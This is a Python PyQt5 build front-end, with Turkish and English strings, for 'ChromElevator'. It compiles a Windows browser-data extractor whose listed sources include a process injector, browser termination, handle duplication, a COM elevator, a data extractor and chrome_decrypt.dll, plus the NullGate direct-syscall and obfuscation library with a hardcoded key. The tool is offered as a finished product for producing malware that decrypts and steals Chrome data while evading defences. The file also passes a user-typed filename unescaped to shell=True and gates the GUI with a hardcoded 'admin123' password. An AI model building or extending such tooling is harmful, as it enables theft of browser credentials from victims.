import sys
import os
import subprocess
import threading
from datetime import datetime
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QTabWidget, QLabel, QComboBox, QPushButton, QTextEdit, QProgressBar,
    QMessageBox, QGroupBox, QInputDialog, QLineEdit, QDialog, QMenuBar,
    QAction, QGraphicsDropShadowEffect
)
from PyQt5.QtCore import Qt, pyqtSignal, QObject
from PyQt5.QtGui import QFont, QColor, QTextCursor, QTextCharFormat

# ===================== KONFİGÜRASYON =====================
PROJECT_ROOT = os.getcwd()
BUILD_DIR = os.path.join(PROJECT_ROOT, "build")
os.makedirs(BUILD_DIR, exist_ok=True)
DEFAULT_PASSWORD = "admin123"  # Varsayılan şifre – menüden değiştirilebilir
NULLGATE_KEY = "FfqO3ZQ6XJ+SICAp"  # NullGate şifreleme anahtarı

# ===================== DÜZELTİLMİŞ DERLEME KOMUTLARI =====================

def get_linux_build_cmd(output_name):
    """Linux ortamında cross‑compile ile Windows exe üretir ve build/ klasörüne kaydeder."""
    target_path = f"build/{output_name}"
    return (
        f'x86_64-w64-mingw32-g++ -std=c++23 -o {target_path} breakpointhevxi.cpp '
        f'NullGate/src/nullgate/syscalls.cpp '
        f'NullGate/src/nullgate/obfuscation.cpp '
        f'NullGate/src/nullgate/syscalls.S '
        f'-I"{PROJECT_ROOT}/NullGate/include" '
        f'-I"{PROJECT_ROOT}/vcpkg/installed/x64-mingw-static/include" '
        f'-L"{PROJECT_ROOT}/vcpkg/installed/x64-mingw-static/lib" '
        f'-DNULLGATE_KEY=\\"{NULLGATE_KEY}\\" '
        f'-static -O2 '
        f'-lsqlite3 -lzip -lcurl '
        f'-lpsapi -lshlwapi -lshell32 -lntdll -lws2_32 -lgdi32 -lz -lbz2 '
        f'-lbcrypt -liphlpapi -lcrypt32 -lsecur32'
    )

def get_windows_build_cmd(output_name):
    """Windows ortamında native MinGW ile exe üretir ve build\ klasörüne kaydeder."""
    target_path = f"build\\{output_name}"
    return (
        f'g++ -std=c++23 -o {target_path} breakpointhevxi.cpp '
        f'NullGate/src/nullgate/syscalls.cpp '
        f'NullGate/src/nullgate/obfuscation.cpp '
        f'NullGate/src/nullgate/syscalls.S '
        f'-I"{PROJECT_ROOT}/NullGate/include" '
        f'-I"{PROJECT_ROOT}/vcpkg/installed/x64-mingw-static/include" '
        f'-L"{PROJECT_ROOT}/vcpkg/installed/x64-mingw-static/lib" '
        f'-DNULLGATE_KEY=\\"{NULLGATE_KEY}\\" '
        f'-static -O2 '
        f'-lsqlite3 -lzip -lcurl '
        f'-lpsapi -lshlwapi -lshell32 -lntdll -lws2_32 -lgdi32 -lz -lbz2 '
        f'-lbcrypt -liphlpapi -lcrypt32 -lsecur32'
    )

def get_dll_build_cmd():
    """
    DLL COM Elevator2 projesini derlemek için uygun g++/mingw komutunu döndürür.
    Platforma göre farklı komut üretir.
    """
    is_linux_cross = (sys.platform.startswith('linux') or sys.platform.startswith('darwin'))
    
    if is_linux_cross:
        # Linux üzerinde cross-compile (Windows hedef)
        compiler = 'x86_64-w64-mingw32-g++'
        target_ext = '.exe'
        out_name = 'chromelevator.exe'
        # Kaynak dosyalar (örnek proje yapısına göre)
        sources = (
            'src/injector/injector_main.cpp '
            'src/injector/browser_discovery.cpp '
            'src/injector/browser_terminator.cpp '
            'src/injector/process_manager.cpp '
            'src/injector/pipe_server.cpp '
            'src/injector/injector.cpp '
            'src/com/elevator.cpp '
            'src/sys/internal_api.cpp '
            'src/crypto/chacha20.cpp '
            'src/crypto/aes_gcm.cpp '
            'src/payload/pipe_client.cpp '
            'src/payload/data_extractor.cpp '
            'src/payload/handle_duplicator.cpp '
            'src/payload/payload_main.cpp '
            'src/sys/bootstrap.cpp '
        )
        # Include ve lib yolları
        includes = (
            f'-I"{PROJECT_ROOT}/include" '
            f'-I"{PROJECT_ROOT}/src" '
            f'-I"{PROJECT_ROOT}/libs/sqlite" '
            f'-I"{PROJECT_ROOT}/NullGate/include" '
        )
        libs = (
            '-L. -Lbuild '
            '-lsqlite3 -lbcrypt -lole32 -loleaut32 -lshell32 -lversion -lcomsuppw '
            '-lcrypt32 -ladvapi32 -lkernel32 -luser32 -lntdll -lpsapi -lshlwapi '
            '-lws2_32 -lgdi32 -lz -lbz2 -liphlpapi -lsecur32 '
            '-static -O2'
        )
    else:
        # Windows native
        compiler = 'g++'
        target_ext = '.exe'
        out_name = 'chromelevator.exe'
        sources = (
            'src\\injector\\injector_main.cpp '
            'src\\injector\\browser_discovery.cpp '
            'src\\injector\\browser_terminator.cpp '
            'src\\injector\\process_manager.cpp '
            'src\\injector\\pipe_server.cpp '
            'src\\injector\\injector.cpp '
            'src\\com\\elevator.cpp '
            'src\\sys\\internal_api.cpp '
            'src\\crypto\\chacha20.cpp '
            'src\\crypto\\aes_gcm.cpp '
            'src\\payload\\pipe_client.cpp '
            'src\\payload\\data_extractor.cpp '
            'src\\payload\\handle_duplicator.cpp '
            'src\\payload\\payload_main.cpp '
            'src\\sys\\bootstrap.cpp '
        )
        includes = (
            f'-I"{PROJECT_ROOT}\\include" '
            f'-I"{PROJECT_ROOT}\\src" '
            f'-I"{PROJECT_ROOT}\\libs\\sqlite" '
            f'-I"{PROJECT_ROOT}\\NullGate\\include" '
        )
        libs = (
            '-L. -Lbuild '
            '-lsqlite3 -lbcrypt -lole32 -loleaut32 -lshell32 -lversion -lcomsuppw '
            '-lcrypt32 -ladvapi32 -lkernel32 -luser32 -lntdll -lpsapi -lshlwapi '
            '-lws2_32 -lgdi32 -lz -lbz2 -liphlpapi -lsecur32 '
            '-static -O2'
        )
    
    target = f'build/{out_name}' if is_linux_cross else f'build\\{out_name}'
    cmd = f'{compiler} -std=c++23 -o {target} {sources} {includes} {libs}'
    return cmd

# ===================== BuildWorker SINIFI =====================
class BuildWorker(QObject):
    output_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(int)
    error_signal = pyqtSignal(str)

    def __init__(self, command, cwd=None):
        super().__init__()
        self.command = command
        self.cwd = cwd or PROJECT_ROOT
        self.process = None

    def run(self):
        try:
            self.process = subprocess.Popen(
                self.command,
                shell=True,
                cwd=self.cwd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            for line in iter(self.process.stdout.readline, ''):
                if line:
                    self.output_signal.emit(line)
            self.process.stdout.close()
            return_code = self.process.wait()
            self.finished_signal.emit(return_code)
        except Exception as e:
            self.error_signal.emit(str(e))

    def stop(self):
        if self.process and self.process.poll() is None:
            self.process.terminate()
            self.process.wait()
            self.finished_signal.emit(-1)

# ===================== GİRİŞ EKRANI =====================
class LoginDialog(QDialog):
    def __init__(self, password, parent=None):
        super().__init__(parent)
        self.password = password
        self.setWindowTitle("🔐 Yetkilendirme")
        self.setFixedSize(420, 220)
        self.setStyleSheet("""
            QDialog {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                                            stop:0 #1a1a2e, stop:1 #2d2d44);
                border-radius: 16px;
            }
            QLabel { color: #e0e0e0; font-size: 14px; }
            QLineEdit {
                background: #2a2a42; color: white;
                border: 2px solid #4a6fa5; border-radius: 10px;
                padding: 10px 14px; font-size: 14px;
            }
            QLineEdit:focus { border-color: #6a9fd5; }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #4a6fa5, stop:1 #3b5a8a);
                color: white; border: none; border-radius: 10px;
                padding: 10px 24px; font-weight: bold; font-size: 14px;
                min-width: 100px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #5a7fb5, stop:1 #4a6fa5);
            }
            QPushButton:pressed { background: #3b5a8a; }
        """)

        layout = QVBoxLayout(self)
        layout.setSpacing(18)
        layout.setContentsMargins(30, 30, 30, 30)

        title = QLabel("🔑  Yetkilendirme")
        title.setFont(QFont("Segoe UI", 18, QFont.Bold))
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)

        self.pw_input = QLineEdit()
        self.pw_input.setPlaceholderText("Şifrenizi girin / Enter password")
        self.pw_input.setEchoMode(QLineEdit.Password)
        self.pw_input.returnPressed.connect(self.accept)
        layout.addWidget(self.pw_input)

        btn_layout = QHBoxLayout()
        self.ok_btn = QPushButton("✅  Giriş")
        self.ok_btn.clicked.connect(self.accept)
        self.cancel_btn = QPushButton("❌  İptal")
        self.cancel_btn.clicked.connect(self.reject)
        btn_layout.addWidget(self.ok_btn)
        btn_layout.addWidget(self.cancel_btn)
        layout.addLayout(btn_layout)

        self.error_label = QLabel("")
        self.error_label.setStyleSheet("color: #ff6b6b; font-weight: bold; font-size: 13px;")
        self.error_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.error_label)

    def accept(self):
        if self.pw_input.text() == self.password:
            super().accept()
        else:
            self.error_label.setText("❌  Hatalı şifre! / Wrong password!")
            self.pw_input.clear()
            self.pw_input.setFocus()

# ===================== ANA PENCERE =====================
class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.current_lang = "tr"
        self.worker = None
        self.thread = None
        self.build_running = False
        self.password = DEFAULT_PASSWORD

        self.init_strings()
        self.setWindowTitle(self.strings[self.current_lang]["window_title"])
        self.setGeometry(100, 100, 1100, 750)
        self.apply_style()

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(16)
        main_layout.setContentsMargins(24, 24, 24, 24)

        self.create_menu()

        # Başlık (gölgeli)
        self.title_label = QLabel("⚡ ChromElevator Build System")
        self.title_label.setFont(QFont("Segoe UI", 26, QFont.Bold))
        self.title_label.setAlignment(Qt.AlignCenter)
        self.title_label.setStyleSheet("color: #e0e0e0; padding: 10px;")
        shadow = QGraphicsDropShadowEffect()
        shadow.setBlurRadius(20)
        shadow.setColor(QColor(0, 0, 0, 200))
        shadow.setOffset(4, 4)
        self.title_label.setGraphicsEffect(shadow)
        main_layout.addWidget(self.title_label)

        # Sekmeler
        self.tabs = QTabWidget()
        main_layout.addWidget(self.tabs)

        self.hw_tab = QWidget()
        self.tabs.addTab(self.hw_tab, self.strings[self.current_lang]["tab_hw"])
        self.setup_hw_tab()

        self.dll_tab = QWidget()
        self.tabs.addTab(self.dll_tab, self.strings[self.current_lang]["tab_dll"])
        self.setup_dll_tab()

        # Durum çubuğu
        status_layout = QHBoxLayout()
        self.progress = QProgressBar()
        self.progress.setRange(0, 0)  # belirsiz mod
        self.progress.setVisible(False)
        status_layout.addWidget(self.progress)

        self.status_label = QLabel(self.strings[self.current_lang]["status_ready"])
        self.status_label.setFont(QFont("Segoe UI", 12))
        self.status_label.setStyleSheet("color: #aaa; padding: 5px;")
        status_layout.addWidget(self.status_label)

        self.cancel_btn = QPushButton("🛑  İptal")
        self.cancel_btn.setVisible(False)
        self.cancel_btn.setStyleSheet("""
            QPushButton {
                background: #c0392b; color: white; border: none;
                border-radius: 8px; padding: 6px 16px; font-weight: bold;
            }
            QPushButton:hover { background: #e74c3c; }
        """)
        self.cancel_btn.clicked.connect(self.cancel_build)
        status_layout.addWidget(self.cancel_btn)

        main_layout.addLayout(status_layout)

        # Log alanı
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setFont(QFont("Consolas", 11))
        main_layout.addWidget(self.log)

        self.log.append(self.strings[self.current_lang]["welcome"])

    # -------------------- DİL VE STRİNG'LER --------------------
    def init_strings(self):
        self.strings = {
            "tr": {
                "window_title": "ChromElevator – Profesyonel Derleme Sistemi",
                "welcome": "🚀 Arayüz başlatıldı. Lütfen derleme yöntemini seçin ve 'Derle' butonuna tıklayın.",
                "status_ready": "✅  Hazır",
                "status_building": "⏳  Derleniyor...",
                "status_success": "✅  Başarılı",
                "status_error": "❌  Hata",
                "tab_hw": "🛠️  Hardware Breakpoint",
                "tab_dll": "🧩  DLL COM Elevator2",
                "group_os": "🎯  Hedef İşletim Sistemi",
                "label_platform": "Platform:",
                "hw_linux": "🐧  Linux (cross-compile)",
                "hw_windows": "🪟  Windows (native)",
                "btn_build": "🔨  Derlemeyi Başlat",
                "btn_dll_build": "⚙️  DLL Projesini Derle (g++/MinGW)",
                "dll_info": "🧩  DLL COM Elevator2 modu, doğrudan g++/MinGW ile derlenir.\n📦  Çıktı: chromelevator.exe, chrome_decrypt.dll vb.\n🌍  Windows ve Linux (cross-compile) destekler.",
                "hw_info": "💡  Çıktı dosyasının adını derleme sırasında belirleyebilirsiniz.",
                "input_title": "Çıktı Dosyası Adı",
                "input_label": "Derlenecek programın adını girin (örnek: myprogram.exe):",
                "input_default": "output.exe",
                "input_cancel": "❌  Derleme iptal edildi (geçersiz dosya adı).",
                "build_start": "▶️  Derleme başlatılıyor: {}",
                "build_cmd": "📝  Komut: {}",
                "build_finished_ok": "\n✅  Derleme BAŞARIYLA tamamlandı!",
                "build_finished_fail": "\n❌  Derleme HATA ile tamamlandı (kod {}).",
                "build_error": "🚨  HATA: {}",
                "dll_only_windows": "DLL COM Elevator2 modu sadece Windows işletim sisteminde çalışır.",
                "dll_bat_missing": "{} dosyası bulunamadı!",
                "build_success_title": "Başarılı",
                "build_success_msg": "Derleme başarıyla tamamlandı!",
                "build_fail_title": "Hata",
                "build_fail_msg": "Derleme hatası!\nKod: {}",
                "menu_file": "📁 Dosya",
                "menu_change_pw": "🔑 Şifre Değiştir",
                "menu_exit": "❌ Çıkış",
                "menu_help": "❓ Yardım",
                "menu_about": "ℹ️ Hakkında",
                "menu_lang": "🌐  Dil",
                "menu_tr": "Türkçe",
                "menu_en": "English",
                "about_title": "Hakkında / About",
                "about_text": "<h2>⚡ ChromElevator Build System</h2>"
                               "<p><b>Sürüm / Version:</b> 2.0</p>"
                               "<p><b>Geliştirici / Developer:</b> Eren</p>"
                               "<p><b>Açıklama / Description:</b><br>"
                               "Profesyonel derleme arayüzü ile Hardware Breakpoint "
                               "ve DLL COM Elevator2 yöntemlerini destekler.</p>"
                               "<p style='color:#aaa;'>© 2026 Tüm hakları saklıdır.</p>",
                "change_pw_title": "Şifre Değiştir",
                "change_pw_label": "Yeni şifreyi girin:",
                "change_pw_success": "✅ Şifre başarıyla değiştirildi!",
                "cancel_build": "🛑 Derleme iptal edildi.",
            },
            "en": {
                "window_title": "ChromElevator – Professional Build System",
                "welcome": "🚀 Interface started. Please select a build method and click 'Build'.",
                "status_ready": "✅  Ready",
                "status_building": "⏳  Building...",
                "status_success": "✅  Success",
                "status_error": "❌  Error",
                "tab_hw": "🛠️  Hardware Breakpoint",
                "tab_dll": "🧩  DLL COM Elevator2",
                "group_os": "🎯  Target Operating System",
                "label_platform": "Platform:",
                "hw_linux": "🐧  Linux (cross-compile)",
                "hw_windows": "🪟  Windows (native)",
                "btn_build": "🔨  Start Build",
                "btn_dll_build": "⚙️  Build DLL Project (g++/MinGW)",
                "dll_info": "🧩  DLL COM Elevator2 mode builds directly with g++/MinGW.\n📦  Output: chromelevator.exe, chrome_decrypt.dll, etc.\n🌍  Supports Windows and Linux (cross-compile).",
                "hw_info": "💡  You can specify the output filename during the build.",
                "input_title": "Output Filename",
                "input_label": "Enter the name of the program to build (e.g., myprogram.exe):",
                "input_default": "output.exe",
                "input_cancel": "❌  Build cancelled (invalid filename).",
                "build_start": "▶️  Build started: {}",
                "build_cmd": "📝  Command: {}",
                "build_finished_ok": "\n✅  Build SUCCEEDED!",
                "build_finished_fail": "\n❌  Build FAILED with code {}.",
                "build_error": "🚨  ERROR: {}",
                "dll_only_windows": "DLL COM Elevator2 mode only works on Windows.",
                "dll_bat_missing": "{} not found!",
                "build_success_title": "Success",
                "build_success_msg": "Build completed successfully!",
                "build_fail_title": "Error",
                "build_fail_msg": "Build failed!\nCode: {}",
                "menu_file": "📁 File",
                "menu_change_pw": "🔑 Change Password",
                "menu_exit": "❌ Exit",
                "menu_help": "❓ Help",
                "menu_about": "ℹ️ About",
                "menu_lang": "🌐  Language",
                "menu_tr": "Türkçe",
                "menu_en": "English",
                "about_title": "About",
                "about_text": "<h2>⚡ ChromElevator Build System</h2>"
                               "<p><b>Version:</b> 2.0</p>"
                               "<p><b>Developer:</b> Eren</p>"
                               "<p><b>Description:</b><br>"
                               "Professional build interface supporting Hardware Breakpoint "
                               "and DLL COM Elevator2 methods.</p>"
                               "<p style='color:#aaa;'>© 2026 All rights reserved.</p>",
                "change_pw_title": "Change Password",
                "change_pw_label": "Enter new password:",
                "change_pw_success": "✅ Password changed successfully!",
                "cancel_build": "🛑 Build cancelled.",
            }
        }

    # -------------------- STİL --------------------
    def apply_style(self):
        self.setStyleSheet("""
            QMainWindow {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                                            stop:0 #0d0d1a, stop:1 #1a1a33);
            }
            QLabel { color: #e0e0e0; font-size: 13px; }
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #4a6fa5, stop:1 #2c4a7a);
                color: white; border: none; border-radius: 12px;
                padding: 12px 28px; font-weight: bold; font-size: 14px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                                            stop:0 #5a8fc5, stop:1 #3a5a8a);
            }
            QPushButton:pressed { background: #2c4a7a; }
            QPushButton:disabled {
                background: #3a3a4a; color: #888;
            }
            QTabWidget::pane {
                border: 2px solid #3a3a5a; border-radius: 12px;
                background: rgba(13,13,26,0.8); padding: 8px;
            }
            QTabBar::tab {
                background: #2a2a42; color: #aaa;
                padding: 12px 24px; border-top-left-radius: 10px;
                border-top-right-radius: 10px; font-weight: bold; font-size: 14px;
            }
            QTabBar::tab:selected {
                background: #4a6fa5; color: white;
            }
            QTabBar::tab:hover:!selected {
                background: #3a5a8a; color: #ddd;
            }
            QGroupBox {
                color: #e0e0e0; border: 2px solid #4a6fa5; border-radius: 10px;
                margin-top: 16px; padding-top: 10px; font-weight: bold; font-size: 14px;
            }
            QGroupBox::title {
                subcontrol-origin: margin; left: 16px; padding: 0 10px;
                color: #e0e0e0;
            }
            QTextEdit {
                background: #0a0a16; color: #d4d4d4;
                font-family: 'Consolas', 'Courier New', monospace; font-size: 12px;
                border: 2px solid #3a3a5a; border-radius: 10px; padding: 10px;
            }
            QProgressBar {
                border: 2px solid #4a6fa5; border-radius: 10px;
                background: #0a0a16; text-align: center; color: white;
                font-weight: bold; height: 28px;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                                            stop:0 #4CAF50, stop:1 #8BC34A);
                border-radius: 8px;
            }
            QComboBox {
                background: #2a2a42; color: white;
                border: 2px solid #4a6fa5; border-radius: 10px;
                padding: 8px 14px; font-size: 14px;
            }
            QComboBox::drop-down { border: none; }
            QComboBox::down-arrow { image: none; }
            QComboBox QAbstractItemView {
                background: #2a2a42; color: white;
                selection-background-color: #4a6fa5;
            }
            QMessageBox {
                background: #1e1e2f; color: white;
            }
            QMenuBar {
                background: #1a1a2e; color: #e0e0e0; font-size: 14px; padding: 4px;
            }
            QMenuBar::item {
                background: transparent; padding: 6px 14px;
            }
            QMenuBar::item:selected {
                background: #4a6fa5; border-radius: 6px;
            }
            QMenu {
                background: #2a2a42; color: #e0e0e0;
                border: 1px solid #4a6fa5; border-radius: 8px; padding: 4px;
            }
            QMenu::item { padding: 6px 28px; }
            QMenu::item:selected { background: #4a6fa5; }
        """)

    # -------------------- MENÜ --------------------
    def create_menu(self):
        menubar = self.menuBar()
        s = self.strings[self.current_lang]

        # Dosya menüsü
        file_menu = menubar.addMenu(s["menu_file"])
        change_pw_act = QAction(s["menu_change_pw"], self)
        change_pw_act.triggered.connect(self.change_password)
        file_menu.addAction(change_pw_act)
        file_menu.addSeparator()
        exit_act = QAction(s["menu_exit"], self)
        exit_act.triggered.connect(self.close)
        file_menu.addAction(exit_act)

        # Dil menüsü
        lang_menu = menubar.addMenu(s["menu_lang"])
        act_tr = QAction(s["menu_tr"], self)
        act_tr.triggered.connect(lambda: self.set_language("tr"))
        lang_menu.addAction(act_tr)
        act_en = QAction(s["menu_en"], self)
        act_en.triggered.connect(lambda: self.set_language("en"))
        lang_menu.addAction(act_en)

        # Yardım menüsü
        help_menu = menubar.addMenu(s["menu_help"])
        about_act = QAction(s["menu_about"], self)
        about_act.triggered.connect(self.show_about)
        help_menu.addAction(about_act)

    # -------------------- DİL DEĞİŞTİRME --------------------
    def set_language(self, lang_code):
        if lang_code not in self.strings:
            return
        self.current_lang = lang_code
        s = self.strings[lang_code]

        self.setWindowTitle(s["window_title"])
        # Başlık sabit tutuluyor (icon değişmiyor)

        self.tabs.setTabText(0, s["tab_hw"])
        self.tabs.setTabText(1, s["tab_dll"])

        self.group_os.setTitle(s["group_os"])
        self.label_platform.setText(s["label_platform"])
        self.os_combo.setItemText(0, s["hw_linux"])
        self.os_combo.setItemText(1, s["hw_windows"])
        self.build_hw_btn.setText(s["btn_build"])
        self.hw_info_label.setText(s["hw_info"])

        self.dll_info_label.setText(s["dll_info"])
        self.build_dll_btn.setText(s["btn_dll_build"])

        if self.status_label.text() in ["✅  Hazır", "✅  Ready"]:
            self.status_label.setText(s["status_ready"])

        # Log'un ilk satırını güncelle (sadece welcome mesajı)
        cursor = self.log.textCursor()
        cursor.movePosition(cursor.Start)
        cursor.select(cursor.Document)
        cursor.removeSelectedText()
        cursor.insertText(s["welcome"] + "\n")
        self.log.setTextCursor(cursor)

        # Menüyü yeniden oluştur
        self.menuBar().clear()
        self.create_menu()

    # -------------------- YARDIMCI DİYALOGLAR --------------------
    def show_about(self):
        s = self.strings[self.current_lang]
        QMessageBox.about(self, s["menu_about"], s["about_text"])

    def change_password(self):
        s = self.strings[self.current_lang]
        new_pw, ok = QInputDialog.getText(self, s["change_pw_title"],
                                          s["change_pw_label"], QLineEdit.Password)
        if ok and new_pw.strip():
            self.password = new_pw.strip()
            QMessageBox.information(self, s["build_success_title"], s["change_pw_success"])

    # -------------------- SEKMELERİ KUR --------------------
    def setup_hw_tab(self):
        layout = QVBoxLayout(self.hw_tab)
        layout.setSpacing(20)

        s = self.strings[self.current_lang]
        self.group_os = QGroupBox(s["group_os"])
        os_layout = QHBoxLayout()
        self.label_platform = QLabel(s["label_platform"])
        os_layout.addWidget(self.label_platform)
        self.os_combo = QComboBox()
        self.os_combo.addItems([s["hw_linux"], s["hw_windows"]])
        os_layout.addWidget(self.os_combo)
        os_layout.addStretch()
        self.group_os.setLayout(os_layout)
        layout.addWidget(self.group_os)

        btn_layout = QHBoxLayout()
        self.build_hw_btn = QPushButton(s["btn_build"])
        self.build_hw_btn.setMinimumHeight(55)
        self.build_hw_btn.clicked.connect(self.start_hw_build)
        btn_layout.addWidget(self.build_hw_btn)
        btn_layout.addStretch()
        layout.addLayout(btn_layout)

        self.hw_info_label = QLabel(s["hw_info"])
        self.hw_info_label.setStyleSheet("color: #888; font-style: italic; padding: 5px;")
        layout.addWidget(self.hw_info_label)

        layout.addStretch()

    def setup_dll_tab(self):
        layout = QVBoxLayout(self.dll_tab)
        layout.setSpacing(20)

        s = self.strings[self.current_lang]
        self.dll_info_label = QLabel(s["dll_info"])
        self.dll_info_label.setWordWrap(True)
        self.dll_info_label.setStyleSheet(
            "color: #ccc; font-size: 14px; padding: 12px; "
            "background: rgba(255,255,255,0.05); border-radius: 10px;"
        )
        layout.addWidget(self.dll_info_label)

        btn_layout = QHBoxLayout()
        self.build_dll_btn = QPushButton(s["btn_dll_build"])
        self.build_dll_btn.setMinimumHeight(55)
        self.build_dll_btn.clicked.connect(self.start_dll_build)
        btn_layout.addWidget(self.build_dll_btn)
        btn_layout.addStretch()
        layout.addLayout(btn_layout)

        layout.addStretch()

    # -------------------- DERLEME İŞLEMLERİ --------------------
    def start_hw_build(self):
        s = self.strings[self.current_lang]
        output_name, ok = QInputDialog.getText(
            self, s["input_title"], s["input_label"],
            QLineEdit.Normal, s["input_default"]
        )
        if not ok or not output_name.strip():
            self.log.append(self._timestamp() + " " + s["input_cancel"])
            return
        output_name = output_name.strip()

        os_choice = self.os_combo.currentText()
        if "Linux" in os_choice:
            cmd = get_linux_build_cmd(output_name)
        else:
            cmd = get_windows_build_cmd(output_name)

        self.start_build(cmd, s['build_start'].format(os_choice))

    def start_dll_build(self):
        s = self.strings[self.current_lang]
        # Platform kontrolü: Linux'ta cross-compile yapabilir, Windows'ta native
        # Her iki durumda da g++/mingw kullanılacak.
        cmd = get_dll_build_cmd()
        self.start_build(cmd, "🧩  DLL COM Elevator2 derlemesi başlatılıyor...")

    def start_build(self, command, start_message):
        if self.build_running:
            QMessageBox.warning(self, "Uyarı", "Zaten bir derleme işlemi devam ediyor!")
            return

        self.prepare_build()
        s = self.strings[self.current_lang]
        self.log.append(self._timestamp() + f"\n▶️  {start_message}")
        self.log.append(self._timestamp() + f" {s['build_cmd'].format(command)}\n")
        self.run_build(command)

    def prepare_build(self):
        self.build_hw_btn.setEnabled(False)
        self.build_dll_btn.setEnabled(False)
        self.progress.setVisible(True)
        self.cancel_btn.setVisible(True)
        self.status_label.setText(self.strings[self.current_lang]["status_building"])
        self.log.clear()
        self.build_running = True

    def finish_build(self):
        self.build_hw_btn.setEnabled(True)
        self.build_dll_btn.setEnabled(True)
        self.progress.setVisible(False)
        self.cancel_btn.setVisible(False)
        self.status_label.setText(self.strings[self.current_lang]["status_ready"])
        self.build_running = False

    def cancel_build(self):
        if self.worker:
            self.worker.stop()
            self.log.append(self._timestamp() + " 🛑 " + self.strings[self.current_lang]["cancel_build"])
            self.finish_build()

    def run_build(self, command):
        self.worker = BuildWorker(command)
        self.worker.output_signal.connect(self.append_log)
        self.worker.finished_signal.connect(self.build_finished)
        self.worker.error_signal.connect(self.build_error)

        self.thread = threading.Thread(target=self.worker.run)
        self.thread.daemon = True
        self.thread.start()

    # -------------------- LOG VE GERİ BİLDİRİM --------------------
    def _timestamp(self):
        return f"[{datetime.now().strftime('%H:%M:%S')}]"

    def append_log(self, text):
        cursor = self.log.textCursor()
        cursor.movePosition(cursor.End)
        fmt = QTextCharFormat()
        # Renklendirme
        lower = text.lower()
        if "error" in lower or "fail" in lower or "hata" in lower:
            fmt.setForeground(QColor(255, 100, 100))
        elif "success" in lower or "başarı" in lower or "tamamlandı" in lower:
            fmt.setForeground(QColor(100, 255, 100))
        else:
            fmt.setForeground(QColor(212, 212, 212))
        # Zaman damgası ekle (her satıra ayrı ayrı)
        lines = text.rstrip().split('\n')
        for line in lines:
            if line.strip():
                cursor.insertText(self._timestamp() + " " + line + "\n", fmt)
            else:
                cursor.insertText("\n", fmt)
        self.log.setTextCursor(cursor)
        self.log.ensureCursorVisible()

    def build_finished(self, return_code):
        s = self.strings[self.current_lang]
        if return_code == 0:
            self.log.append(self._timestamp() + s["build_finished_ok"])
            self.status_label.setText(s["status_success"])
            QMessageBox.information(self, s["build_success_title"], s["build_success_msg"])
        elif return_code == -1:
            # İptal edildi, zaten mesaj verildi
            pass
        else:
            self.log.append(self._timestamp() + s["build_finished_fail"].format(return_code))
            self.status_label.setText(s["status_error"])
            QMessageBox.critical(self, s["build_fail_title"], s["build_fail_msg"].format(return_code))
        self.finish_build()

    def build_error(self, error_msg):
        s = self.strings[self.current_lang]
        self.log.append(self._timestamp() + s["build_error"].format(error_msg))
        self.status_label.setText(s["status_error"])
        self.finish_build()
        QMessageBox.critical(self, s["build_fail_title"], f"Derleme sırasında hata oluştu:\n{error_msg}")

# ===================== ÇALIŞTIRMA =====================
if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setFont(QFont("Segoe UI", 10))

    window = MainWindow()
    login = LoginDialog(window.password, window)
    if login.exec_() != QDialog.Accepted:
        sys.exit(0)

    window.show()
    sys.exit(app.exec_())
